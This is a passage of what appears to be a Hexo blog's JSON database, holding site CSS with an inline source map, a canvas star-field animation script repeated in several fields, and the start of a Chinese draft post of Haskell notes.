}\n}\n\n#canvas {\n  margin: 200px auto;\n}\n\n.github {\n  position: absolute;\n  top: 10px;\n  right: 10px;\n  width: 20px;\n}\n\n/*# sourceMappingURL=data:application/json;charset=utf8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIm1haW4uc2NzcyIsIm1haW4uY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBOztFQUVJLGFBQWE7RUFDYixZQUFZO0VBQ1osWUFBWTtFQUNaLGFBQWE7RUFDYixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxxQkFBcUI7RUFFckIscUJBQXFCO0VBQ3JCLGNBQWM7RUFDZCx5QkFBeUI7RUFFekIsc0JBQXNCO0VBQ3RCLHdCQUF3QjtFQUN4QiwwQkFBMEI7RUFFMUIsdUJBQXVCO0VBQ3ZCLG9CQUFvQjtFQUNwQiwrQkFBd0I7RUFDeEIsdUJBQWdCO0VBQ2hCLHdCQUF3QjtDQUMzQjs7QUFFRDtFQUNJLFlBQVk7RUFDWixhQUFhO0VBQ2Isc0ZBQWlDO0VBQWpDLGlGQUFpQztDQUVwQzs7QUFFRDtFQUNJLGVBQWU7RUFDZixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxZQUFZO0VBQ1osYUFBYTtDQUNoQjs7QUFFRDtFQUNJLHdCQUF3QjtFQUN4QixnQkFBZ0I7RUFDaEIsZ0NBQVc7RUFDWCxZQUFZO0VBQ1osZ0JBQWdCO0VBQ2hCLFlBQVk7RUFDWixjQUFjO0VBQ2QsbUJBQW1CO0VBQ25CLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osY0FBYztFQUNkLFlBQVk7Q0FDZjs7QUFFRDtFQUNJLGFBQWE7RUFDYixtQkFBbUI7RUFDbkIsVUFBVTtFQUNWLG9CQUFvQjtDQUN2Qjs7QUFFRDtFQUNJLHNCQUFzQjtFQUN0QixlQUFXO0VBQ1gsWUFBWTtFQUNaLHFDQUFxQztFQUNyQyw2QkFBNkI7Q0FDaEM7O0FBRUQ7RUFDSSxXQUFXO0NBQ2Q7O0FBRUQsT0FBTztBQUVQO0VBQ0ksWUFBWTtFQUNaLG1CQUFtQjtFQUNuQixZQUFZO0VBQ1osVUFBVTtFQUNWLG1CQUFtQjtFQUNuQixhQUFhO0VBQ2IsMEJBQWlCO0VBQ2pCLGtDQUF5QjtFQUN6QixnQkFBZ0I7Q0FDbkI7O0FBRUQ7RUFDSSxtQkFBVztFQUNYLDJCQUEyQjtFQUMzQiw0REFBdUM7RUFBdkMsb0RBQXVDO0NBQzFDOztBQUVEO0VBQ0k7SUFDSSwyQkFBMkI7R0FDOUI7Q0NESjs7QURJRDtFQUNJLG1CQUFtQjtDQUN0Qjs7QUFFRDtFQUNJLG1CQUFtQjtFQUNuQixVQUFVO0VBQ1YsWUFBWTtFQUNaLFlBQVk7Q0FDZiIsImZpbGUiOiJtYWluLmNzcyIsInNvdXJjZXNDb250ZW50IjpbImh0bWwsXG5ib2R5IHtcbiAgICBwYWRkaW5nOiAwcHg7XG4gICAgbWFyZ2luOiAwcHg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIHBvc2l0aW9uOiBmaXhlZDtcbn1cblxuYm9keSB7XG4gICAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gICAgZGlzcGxheTogLXdlYmtpdC1mbGV4O1xuICAgIGRpc3BsYXk6IC1tcy1mbGV4Ym94O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgLXdlYmtpdC1ib3gtcGFjazogY2VudGVyO1xuICAgIC13ZWJraXQtanVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIC13ZWJraXQtYm94LWFsaWduOiBjZW50ZXI7XG4gICAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAgIC1tcy1mbGV4LWFsaWduOiBjZW50ZXI7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gICAgZmlsdGVyOiBjb250cmFzdCgxMjAlKTtcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjaztcbn1cblxuLmNvbnRhaW5lciB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xuICAgIGJhY2tncm91bmQtaW1hZ2U6IHJhZGlhbC1ncmFkaWVudCgxNjAwcHggYXQgNzAlIDEyMCUsIHJnYmEoMzMsIDM5LCA4MCwgMSkgMTAlLCAjMDIwNDA5IDEwMCUpO1xuXG59XG5cbi5jb250ZW50IHtcbiAgICB3aWR0aDogaW5oZXJpdDtcbiAgICBoZWlnaHQ6IGluaGVyaXQ7XG59XG5cbiN1bml2ZXJzZSB7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAxMDAlO1xufVxuXG4jZm9vdGVyQ29udGVudCB7XG4gICAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7XG4gICAgZm9udC1zaXplOiAxMTAlO1xuICAgIGNvbG9yOiByZ2JhKDIwMCwgMjIwLCAyNTUsIC4zKTtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgYm90dG9tOiAwcHg7XG4gICAgcGFkZGluZzogMjBweDtcbiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7XG4gICAgei1pbmRleDogMjA7XG59XG5cbiNmb290ZXIge1xuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgICBib3R0b206IDBweDtcbiAgICBoZWlnaHQ6IDMwMHB4O1xuICAgIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICAgIGhlaWdodDogMTAwJTtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtODAwcHg7XG59XG5cbmEge1xuICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTtcbiAgICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAxKTtcbiAgICBvcGFjaXR5OiAuNDtcbiAgICAtd2Via2l0LXRyYW5zaXRpb246IG9wYWNpdHkgLjRzIGVhc2U7XG4gICAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gICAgb3BhY2l0eTogMTtcbn1cblxuLypib3gqL1xuXG4jYm94IHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgYm90dG9tOiAzMCU7XG4gICAgbGVmdDogNTAlO1xuICAgIG1hcmdpbi1sZWZ0OiAtOTZweDtcbiAgICB6LWluZGV4OiAxMDA7XG4gICAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgICAtd2Via2l0LXRyYW5zZm9ybTogcm90YXRlKC0xMmRlZyk7XG4gICAgZm9udC1zaXplOiAxMnB4O1xufVxuXG4udHh0IHtcbiAgICBjb2xvcjogaHNsYSgwLCAwJSwgMCUsIDApO1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICAgIHRyYW5zaXRpb246IHRleHQtc2hhZG93IDJzIGN1YmljLWJlemllcigwLCAxLCAwLCAxKTtcbn1cblxuQC1tb3otZG9jdW1lbnQgdXJsLXByZWZpeCgpIHtcbiAgICAudHh0IHtcbiAgICAgICAgdGV4dC1zaGFkb3c6ICNmZmYgMCAwIDIwcHg7XG4gICAgfVxufVxuXG4jY2FudmFze1xuICAgIG1hcmdpbjogMjAwcHggYXV0bztcbn1cblxuLmdpdGh1YntcbiAgICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gICAgdG9wOiAxMHB4O1xuICAgIHJpZ2h0OiAxMHB4O1xuICAgIHdpZHRoOiAyMHB4O1xufSIsImh0bWwsXG5ib2R5IHtcbiAgcGFkZGluZzogMHB4O1xuICBtYXJnaW46IDBweDtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xufVxuXG5ib2R5IHtcbiAgZGlzcGxheTogLXdlYmtpdC1ib3g7XG4gIGRpc3BsYXk6IC13ZWJraXQtZmxleDtcbiAgZGlzcGxheTogLW1zLWZsZXhib3g7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIC13ZWJraXQtYm94LXBhY2s6IGNlbnRlcjtcbiAgLXdlYmtpdC1qdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLW1zLWZsZXgtcGFjazogY2VudGVyO1xuICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgLXdlYmtpdC1ib3gtYWxpZ246IGNlbnRlcjtcbiAgLXdlYmtpdC1hbGlnbi1pdGVtczogY2VudGVyO1xuICAtbXMtZmxleC1hbGlnbjogY2VudGVyO1xuICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAtd2Via2l0LWZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGZpbHRlcjogY29udHJhc3QoMTIwJSk7XG4gIGJhY2tncm91bmQtY29sb3I6IGJsYWNrO1xufVxuXG4uY29udGFpbmVyIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbiAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KDE2MDBweCBhdCA3MCUgMTIwJSwgIzIxMjc1MCAxMCUsICMwMjA0MDkgMTAwJSk7XG59XG5cbi5jb250ZW50IHtcbiAgd2lkdGg6IGluaGVyaXQ7XG4gIGhlaWdodDogaW5oZXJpdDtcbn1cblxuI3VuaXZlcnNlIHtcbiAgd2lkdGg6IDEwMCU7XG4gIGhlaWdodDogMTAwJTtcbn1cblxuI2Zvb3RlckNvbnRlbnQge1xuICBmb250LWZhbWlseTogc2Fucy1zZXJpZjtcbiAgZm9udC1zaXplOiAxMTAlO1xuICBjb2xvcjogcmdiYSgyMDAsIDIyMCwgMjU1LCAwLjMpO1xuICB3aWR0aDogMTAwJTtcbiAgcG9zaXRpb246IGZpeGVkO1xuICBib3R0b206IDBweDtcbiAgcGFkZGluZzogMjBweDtcbiAgdGV4dC1hbGlnbjogY2VudGVyO1xuICB6LWluZGV4OiAyMDtcbn1cblxuI2Zvb3RlciB7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgYm90dG9tOiAwcHg7XG4gIGhlaWdodDogMzAwcHg7XG4gIHdpZHRoOiAxMDAlO1xufVxuXG4jc2NlbmUge1xuICBoZWlnaHQ6IDEwMCU7XG4gIHBvc2l0aW9uOiBhYnNvbHV0ZTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTgwMHB4O1xufVxuXG5hIHtcbiAgdGV4dC1kZWNvcmF0aW9uOiBub25lO1xuICBjb2xvcjogI2M4ZGNmZjtcbiAgb3BhY2l0eTogLjQ7XG4gIC13ZWJraXQtdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbiAgdHJhbnNpdGlvbjogb3BhY2l0eSAuNHMgZWFzZTtcbn1cblxuYTpob3ZlciB7XG4gIG9wYWNpdHk6IDE7XG59XG5cbi8qYm94Ki9cbiNib3gge1xuICBjb2xvcjogI2ZmZjtcbiAgcG9zaXRpb246IGFic29sdXRlO1xuICBib3R0b206IDMwJTtcbiAgbGVmdDogNTAlO1xuICBtYXJnaW4tbGVmdDogLTk2cHg7XG4gIHotaW5kZXg6IDEwMDtcbiAgdHJhbnNmb3JtOiByb3RhdGUoLTEyZGVnKTtcbiAgLXdlYmtpdC10cmFuc2Zvcm06IHJvdGF0ZSgtMTJkZWcpO1xuICBmb250LXNpemU6IDEycHg7XG59XG5cbi50eHQge1xuICBjb2xvcjogdHJhbnNwYXJlbnQ7XG4gIHRleHQtc2hhZG93OiAjZmZmIDAgMCAxMHB4O1xuICB0cmFuc2l0aW9uOiB0ZXh0LXNoYWRvdyAycyBjdWJpYy1iZXppZXIoMCwgMSwgMCwgMSk7XG59XG5cbkAtbW96LWRvY3VtZW50IHVybC1wcmVmaXgoKSB7XG4gIC50eHQge1xuICAgIHRleHQtc2hhZG93OiAjZmZmIDAgMCAyMHB4O1xuICB9XG59XG5cbiNjYW52YXMge1xuICBtYXJnaW46IDIwMHB4IGF1dG87XG59XG5cbi5naXRodWIge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIHRvcDogMTBweDtcbiAgcmlnaHQ6IDEwcHg7XG4gIHdpZHRoOiAyMHB4O1xufVxuIl19 */\n"},{"_content":"window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;\n\nvar starDensity = .216;\nvar speedCoeff = .05;\nvar width;\nvar height;\nvar starCount;\nvar circleRadius;\nvar circleCenter;\nvar first = true;\nvar giantColor = '180,184,240';\nvar starColor = '226,225,142';\nvar cometColor = '226,225,224';\nvar canva = document.getElementById('universe');\nvar stars = [];\nvar universe;\n\nwindowResizeHandler();\nwindow.addEventListener('resize', windowResizeHandler, false);\n\ncreateUniverse();\n\nfunction createUniverse() {\n  universe = canva.getContext('2d');\n\n  for (var i = 0; i < starCount; i++) {\n    stars[i] = new Star();\n    stars[i].reset();\n  }\n\n  draw();\n}\n\nfunction draw() {\n  universe.clearRect(0, 0, width, height);\n\n  var starsLength = stars.length;\n\n  for (var i = 0; i < starsLength; i++) {\n    var star = stars[i];\n    star.move();\n    star.fadeIn();\n    star.fadeOut();\n    star.draw();\n  }\n\n  window.requestAnimationFrame(draw);\n}\n\nfunction Star() {\n\n  this.reset = function() {\n    this.giant = getProbability(3);\n    this.comet = this.giant || first ? false : getProbability(10);\n    this.x = getRandInterval(0, width - 10);\n    this.y = getRandInterval(0, height);\n    this.r = getRandInterval(1.1, 2.6);\n    this.dx = getRandInterval(speedCoeff, 6 * speedCoeff) + (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120) + speedCoeff * 2;\n    this.dy = -getRandInterval(speedCoeff, 6 * speedCoeff) - (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120);\n    this.fadingOut = null;\n    this.fadingIn = true;\n    this.opacity = 0;\n    this.opacityTresh = getRandInterval(.2, 1 - (this.comet + 1 - 1) * .4);\n    this.do = getRandInterval(0.0005, 0.002) + (this.comet + 1 - 1) * .001;\n  };\n\n  this.fadeIn = function() {\n    if (this.fadingIn) {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true;\n      this.opacity += this.do;\n    }\n  };\n\n  this.fadeOut = function() {\n    if (this.fadingOut) {\n      this.fadingOut = this.opacity < 0 ? false : true;\n      this.opacity -= this.do / 2;\n      if (this.x > width || this.y < 0) {\n        this.fadingOut = false;\n        this.reset();\n      }\n    }\n  };\n\n  this.draw = function() {\n    universe.beginPath();\n\n    if (this.giant) {\n      universe.fillStyle = 'rgba(' + giantColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 2, 0, 2 * Math.PI, false);\n    } else if (this.comet) {\n      universe.fillStyle = 'rgba(' + cometColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, false);\n\n      //comet tail\n      for (var i = 0; i < 30; i++) {\n        universe.fillStyle = 'rgba(' + cometColor + ',' + (this.opacity - (this.opacity / 20) * i) + ')';\n        universe.rect(this.x - this.dx / 4 * i, this.y - this.dy / 4 * i - 2, 2, 2);\n        universe.fill();\n      }\n    } else {\n      universe.fillStyle = 'rgba(' + starColor + ',' + this.opacity + ')';\n      universe.rect(this.x, this.y, this.r, this.r);\n    }\n\n    universe.closePath();\n    universe.fill();\n  };\n\n  this.move = function() {\n    this.x += this.dx;\n    this.y += this.dy;\n    if (this.fadingOut === false) {\n      this.reset();\n    }\n    if (this.x > width - (width / 4) || this.y < 0) {\n      this.fadingOut = true;\n    }\n  };\n\n  (function() {\n    setTimeout(function() {\n      first = false;\n    }, 50)\n  })()\n}\n\nfunction getProbability(percents) {\n  return ((Math.floor(Math.random() * 1000) + 1) < percents * 10);\n}\n\nfunction getRandInterval(min, max) {\n  return (Math.random() * (max - min) + min);\n}\n\nfunction windowResizeHandler() {\n  width = window.innerWidth;\n  height = window.innerHeight;\n  starCount = width * starDensity;\n  // console.log(starCount)\n  circleRadius = (width > height ? height / 2 : width / 2);\n  circleCenter = {\n    x: width / 2,\n    y: height / 2\n  }\n\n  canva.setAttribute('width', width);\n  canva.setAttribute('height', height);\n}","source":"about/scripts/universe.js","raw":"window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;\n\nvar starDensity = .216;\nvar speedCoeff = .05;\nvar width;\nvar height;\nvar starCount;\nvar circleRadius;\nvar circleCenter;\nvar first = true;\nvar giantColor = '180,184,240';\nvar starColor = '226,225,142';\nvar cometColor = '226,225,224';\nvar canva = document.getElementById('universe');\nvar stars = [];\nvar universe;\n\nwindowResizeHandler();\nwindow.addEventListener('resize', windowResizeHandler, false);\n\ncreateUniverse();\n\nfunction createUniverse() {\n  universe = canva.getContext('2d');\n\n  for (var i = 0; i < starCount; i++) {\n    stars[i] = new Star();\n    stars[i].reset();\n  }\n\n  draw();\n}\n\nfunction draw() {\n  universe.clearRect(0, 0, width, height);\n\n  var starsLength = stars.length;\n\n  for (var i = 0; i < starsLength; i++) {\n    var star = stars[i];\n    star.move();\n    star.fadeIn();\n    star.fadeOut();\n    star.draw();\n  }\n\n  window.requestAnimationFrame(draw);\n}\n\nfunction Star() {\n\n  this.reset = function() {\n    this.giant = getProbability(3);\n    this.comet = this.giant || first ? false : getProbability(10);\n    this.x = getRandInterval(0, width - 10);\n    this.y = getRandInterval(0, height);\n    this.r = getRandInterval(1.1, 2.6);\n    this.dx = getRandInterval(speedCoeff, 6 * speedCoeff) + (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120) + speedCoeff * 2;\n    this.dy = -getRandInterval(speedCoeff, 6 * speedCoeff) - (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120);\n    this.fadingOut = null;\n    this.fadingIn = true;\n    this.opacity = 0;\n    this.opacityTresh = getRandInterval(.2, 1 - (this.comet + 1 - 1) * .4);\n    this.do = getRandInterval(0.0005, 0.002) + (this.comet + 1 - 1) * .001;\n  };\n\n  this.fadeIn = function() {\n    if (this.fadingIn) {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true;\n      this.opacity += this.do;\n    }\n  };\n\n  this.fadeOut = function() {\n    if (this.fadingOut) {\n      this.fadingOut = this.opacity < 0 ? false : true;\n      this.opacity -= this.do / 2;\n      if (this.x > width || this.y < 0) {\n        this.fadingOut = false;\n        this.reset();\n      }\n    }\n  };\n\n  this.draw = function() {\n    universe.beginPath();\n\n    if (this.giant) {\n      universe.fillStyle = 'rgba(' + giantColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 2, 0, 2 * Math.PI, false);\n    } else if (this.comet) {\n      universe.fillStyle = 'rgba(' + cometColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, false);\n\n      //comet tail\n      for (var i = 0; i < 30; i++) {\n        universe.fillStyle = 'rgba(' + cometColor + ',' + (this.opacity - (this.opacity / 20) * i) + ')';\n        universe.rect(this.x - this.dx / 4 * i, this.y - this.dy / 4 * i - 2, 2, 2);\n        universe.fill();\n      }\n    } else {\n      universe.fillStyle = 'rgba(' + starColor + ',' + this.opacity + ')';\n      universe.rect(this.x, this.y, this.r, this.r);\n    }\n\n    universe.closePath();\n    universe.fill();\n  };\n\n  this.move = function() {\n    this.x += this.dx;\n    this.y += this.dy;\n    if (this.fadingOut === false) {\n      this.reset();\n    }\n    if (this.x > width - (width / 4) || this.y < 0) {\n      this.fadingOut = true;\n    }\n  };\n\n  (function() {\n    setTimeout(function() {\n      first = false;\n    }, 50)\n  })()\n}\n\nfunction getProbability(percents) {\n  return ((Math.floor(Math.random() * 1000) + 1) < percents * 10);\n}\n\nfunction getRandInterval(min, max) {\n  return (Math.random() * (max - min) + min);\n}\n\nfunction windowResizeHandler() {\n  width = window.innerWidth;\n  height = window.innerHeight;\n  starCount = width * starDensity;\n  // console.log(starCount)\n  circleRadius = (width > height ? height / 2 : width / 2);\n  circleCenter = {\n    x: width / 2,\n    y: height / 2\n  }\n\n  canva.setAttribute('width', width);\n  canva.setAttribute('height', height);\n}","date":"2017-03-08T19:05:11.000Z","updated":"2017-03-08T19:05:11.000Z","path":"about/scripts/universe.js","layout":"false","title":"","comments":1,"_id":"cj2mm9xri004p5es5y2r17w0w","content":"window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;\n\nvar starDensity = .216;\nvar speedCoeff = .05;\nvar width;\nvar height;\nvar starCount;\nvar circleRadius;\nvar circleCenter;\nvar first = true;\nvar giantColor = '180,184,240';\nvar starColor = '226,225,142';\nvar cometColor = '226,225,224';\nvar canva = document.getElementById('universe');\nvar stars = [];\nvar universe;\n\nwindowResizeHandler();\nwindow.addEventListener('resize', windowResizeHandler, false);\n\ncreateUniverse();\n\nfunction createUniverse() {\n  universe = canva.getContext('2d');\n\n  for (var i = 0; i < starCount; i++) {\n    stars[i] = new Star();\n    stars[i].reset();\n  }\n\n  draw();\n}\n\nfunction draw() {\n  universe.clearRect(0, 0, width, height);\n\n  var starsLength = stars.length;\n\n  for (var i = 0; i < starsLength; i++) {\n    var star = stars[i];\n    star.move();\n    star.fadeIn();\n    star.fadeOut();\n    star.draw();\n  }\n\n  window.requestAnimationFrame(draw);\n}\n\nfunction Star() {\n\n  this.reset = function() {\n    this.giant = getProbability(3);\n    this.comet = this.giant || first ? false : getProbability(10);\n    this.x = getRandInterval(0, width - 10);\n    this.y = getRandInterval(0, height);\n    this.r = getRandInterval(1.1, 2.6);\n    this.dx = getRandInterval(speedCoeff, 6 * speedCoeff) + (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120) + speedCoeff * 2;\n    this.dy = -getRandInterval(speedCoeff, 6 * speedCoeff) - (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120);\n    this.fadingOut = null;\n    this.fadingIn = true;\n    this.opacity = 0;\n    this.opacityTresh = getRandInterval(.2, 1 - (this.comet + 1 - 1) * .4);\n    this.do = getRandInterval(0.0005, 0.002) + (this.comet + 1 - 1) * .001;\n  };\n\n  this.fadeIn = function() {\n    if (this.fadingIn) {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true;\n      this.opacity += this.do;\n    }\n  };\n\n  this.fadeOut = function() {\n    if (this.fadingOut) {\n      this.fadingOut = this.opacity < 0 ? false : true;\n      this.opacity -= this.do / 2;\n      if (this.x > width || this.y < 0) {\n        this.fadingOut = false;\n        this.reset();\n      }\n    }\n  };\n\n  this.draw = function() {\n    universe.beginPath();\n\n    if (this.giant) {\n      universe.fillStyle = 'rgba(' + giantColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 2, 0, 2 * Math.PI, false);\n    } else if (this.comet) {\n      universe.fillStyle = 'rgba(' + cometColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, false);\n\n      //comet tail\n      for (var i = 0; i < 30; i++) {\n        universe.fillStyle = 'rgba(' + cometColor + ',' + (this.opacity - (this.opacity / 20) * i) + ')';\n        universe.rect(this.x - this.dx / 4 * i, this.y - this.dy / 4 * i - 2, 2, 2);\n        universe.fill();\n      }\n    } else {\n      universe.fillStyle = 'rgba(' + starColor + ',' + this.opacity + ')';\n      universe.rect(this.x, this.y, this.r, this.r);\n    }\n\n    universe.closePath();\n    universe.fill();\n  };\n\n  this.move = function() {\n    this.x += this.dx;\n    this.y += this.dy;\n    if (this.fadingOut === false) {\n      this.reset();\n    }\n    if (this.x > width - (width / 4) || this.y < 0) {\n      this.fadingOut = true;\n    }\n  };\n\n  (function() {\n    setTimeout(function() {\n      first = false;\n    }, 50)\n  })()\n}\n\nfunction getProbability(percents) {\n  return ((Math.floor(Math.random() * 1000) + 1) < percents * 10);\n}\n\nfunction getRandInterval(min, max) {\n  return (Math.random() * (max - min) + min);\n}\n\nfunction windowResizeHandler() {\n  width = window.innerWidth;\n  height = window.innerHeight;\n  starCount = width * starDensity;\n  // console.log(starCount)\n  circleRadius = (width > height ? height / 2 : width / 2);\n  circleCenter = {\n    x: width / 2,\n    y: height / 2\n  }\n\n  canva.setAttribute('width', width);\n  canva.setAttribute('height', height);\n}","excerpt":"","more":"window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame ||\n  window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;\n\nvar starDensity = .216;\nvar speedCoeff = .05;\nvar width;\nvar height;\nvar starCount;\nvar circleRadius;\nvar circleCenter;\nvar first = true;\nvar giantColor = '180,184,240';\nvar starColor = '226,225,142';\nvar cometColor = '226,225,224';\nvar canva = document.getElementById('universe');\nvar stars = [];\nvar universe;\n\nwindowResizeHandler();\nwindow.addEventListener('resize', windowResizeHandler, false);\n\ncreateUniverse();\n\nfunction createUniverse() {\n  universe = canva.getContext('2d');\n\n  for (var i = 0; i < starCount; i++) {\n    stars[i] = new Star();\n    stars[i].reset();\n  }\n\n  draw();\n}\n\nfunction draw() {\n  universe.clearRect(0, 0, width, height);\n\n  var starsLength = stars.length;\n\n  for (var i = 0; i < starsLength; i++) {\n    var star = stars[i];\n    star.move();\n    star.fadeIn();\n    star.fadeOut();\n    star.draw();\n  }\n\n  window.requestAnimationFrame(draw);\n}\n\nfunction Star() {\n\n  this.reset = function() {\n    this.giant = getProbability(3);\n    this.comet = this.giant || first ? false : getProbability(10);\n    this.x = getRandInterval(0, width - 10);\n    this.y = getRandInterval(0, height);\n    this.r = getRandInterval(1.1, 2.6);\n    this.dx = getRandInterval(speedCoeff, 6 * speedCoeff) + (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120) + speedCoeff * 2;\n    this.dy = -getRandInterval(speedCoeff, 6 * speedCoeff) - (this.comet + 1 - 1) * speedCoeff * getRandInterval(50, 120);\n    this.fadingOut = null;\n    this.fadingIn = true;\n    this.opacity = 0;\n    this.opacityTresh = getRandInterval(.2, 1 - (this.comet + 1 - 1) * .4);\n    this.do = getRandInterval(0.0005, 0.002) + (this.comet + 1 - 1) * .001;\n  };\n\n  this.fadeIn = function() {\n    if (this.fadingIn) {\n      this.fadingIn = this.opacity > this.opacityTresh ? false : true;\n      this.opacity += this.do;\n    }\n  };\n\n  this.fadeOut = function() {\n    if (this.fadingOut) {\n      this.fadingOut = this.opacity < 0 ? false : true;\n      this.opacity -= this.do / 2;\n      if (this.x > width || this.y < 0) {\n        this.fadingOut = false;\n        this.reset();\n      }\n    }\n  };\n\n  this.draw = function() {\n    universe.beginPath();\n\n    if (this.giant) {\n      universe.fillStyle = 'rgba(' + giantColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 2, 0, 2 * Math.PI, false);\n    } else if (this.comet) {\n      universe.fillStyle = 'rgba(' + cometColor + ',' + this.opacity + ')';\n      universe.arc(this.x, this.y, 1.5, 0, 2 * Math.PI, false);\n\n      //comet tail\n      for (var i = 0; i < 30; i++) {\n        universe.fillStyle = 'rgba(' + cometColor + ',' + (this.opacity - (this.opacity / 20) * i) + ')';\n        universe.rect(this.x - this.dx / 4 * i, this.y - this.dy / 4 * i - 2, 2, 2);\n        universe.fill();\n      }\n    } else {\n      universe.fillStyle = 'rgba(' + starColor + ',' + this.opacity + ')';\n      universe.rect(this.x, this.y, this.r, this.r);\n    }\n\n    universe.closePath();\n    universe.fill();\n  };\n\n  this.move = function() {\n    this.x += this.dx;\n    this.y += this.dy;\n    if (this.fadingOut === false) {\n      this.reset();\n    }\n    if (this.x > width - (width / 4) || this.y < 0) {\n      this.fadingOut = true;\n    }\n  };\n\n  (function() {\n    setTimeout(function() {\n      first = false;\n    }, 50)\n  })()\n}\n\nfunction getProbability(percents) {\n  return ((Math.floor(Math.random() * 1000) + 1) < percents * 10);\n}\n\nfunction getRandInterval(min, max) {\n  return (Math.random() * (max - min) + min);\n}\n\nfunction windowResizeHandler() {\n  width = window.innerWidth;\n  height = window.innerHeight;\n  starCount = width * starDensity;\n  // console.log(starCount)\n  circleRadius = (width > height ? height / 2 : width / 2);\n  circleCenter = {\n    x: width / 2,\n    y: height / 2\n  }\n\n  canva.setAttribute('width', width);\n  canva.setAttribute('height', height);\n}"}],"Post":[{"title":"Haskell 手记（一）","id":"18","updated":"2016-09-01T00:14:45.000Z","_content":"\n#安装\nhttps://www.haskell.org/\n不多说。\n#运行\n>ghci\n\n#代码笔记\n##拼接列表\n>‘A’ :\" SMALL CAT\"\n\n>5:[1,2,3]\n\n>[1,2,3] ++ [5]\n\n\n\n\n","source":"_drafts/Haskell-手记（一）.md","raw":"---\ntitle: Haskell 手记（一）\npermalink: haskell-shou-ji-yi\nid: 18\nupdated: '2016-09-01 01:14:45'\ntags:\n---\n\n#安装\nhttps://www.haskell.org/\n不多说。\n#运行\n>ghci\n\n#代码笔记\n##拼接列表\n>‘A’ :\" SMALL CAT\"\n\n>5:[1,2,3]\n\n>[1,2,3] ++ 